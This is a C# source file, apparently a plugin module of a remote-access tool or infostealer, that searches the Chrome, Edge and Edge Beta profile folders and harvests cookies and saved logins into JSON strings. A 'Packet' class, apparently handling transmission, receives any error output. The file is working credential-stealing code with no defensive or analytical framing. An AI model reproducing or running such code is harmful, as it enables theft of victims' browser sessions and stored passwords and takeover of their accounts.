using System;
using System.IO;

namespace Plugin
{
    internal class Recorvery
    {
        public static string his = "";
        public static string login0 = "";
        public static string totalResults = "";
        public static string totallogins = "";
        public static string totalhistories = "";

        public static void Recorver()
        {
            // Path builder for Chrome install location
            var homeDrive = Environment.GetEnvironmentVariable("HOMEDRIVE");
            var homePath = Environment.GetEnvironmentVariable("HOMEPATH");
            var localAppData = Environment.GetEnvironmentVariable("LOCALAPPDATA");

            var paths = new string[3];
            //paths[0] = homeDrive + homePath + "\\Local Settings\\Application Data\\Google\\Chrome\\User Data\\";
            paths[0] = localAppData + "\\Google\\Chrome\\User Data\\";
            paths[1] = localAppData + "\\Microsoft\\Edge\\User Data\\";
            paths[2] = localAppData + "\\Microsoft\\Edge Beta\\User Data\\";
            //string chromeLoginDataPath = "C:\\Users\\Dwight\\Desktop\\Login Data";


            foreach (var path in paths)
                if (Directory.Exists(path))
                {
                    var browser = "";
                    var fmtString = "[*] {0} {1} extraction.\n";
                    if (path.ToLower().Contains("chrome"))
                        browser = "Google Chrome";
                    else if (path.ToLower().Contains("edge beta"))
                        browser = "Edge Beta";
                    else
                        browser = "Edge";
                    Console.WriteLine(fmtString, "Beginning", browser);
                    // do something
                    ExtractData(path, browser);
                    Console.WriteLine(fmtString, "Finished", browser);
                }

            Console.WriteLine("[*] Done.");
        }

        private static void ExtractData(string path, string browser)
        {
            var chromeManager = new ChromiumCredentialManager(path);
            try
            {
                //getCookies
                var cookies = chromeManager.GetCookies();
                foreach (var cookie in cookies)
                {
                    var jsonArray = cookie.ToJSON();
                    var jsonItems = jsonArray.Trim('[', ']', '\n');
                    totalResults += jsonItems + ",\n";
                }

                totalResults = totalResults.Trim(',', '\n');
                totalResults = "[" + totalResults + "]";

                //getLogins
                var logins = chromeManager.GetSavedLogins();
                foreach (var login in logins) login.Print();
                totallogins = login0;
            }
            catch (Exception ex)
            {
                Packet.Error("[X] Exception: " + ex.Message + ex.StackTrace);
            }
        }
    }
}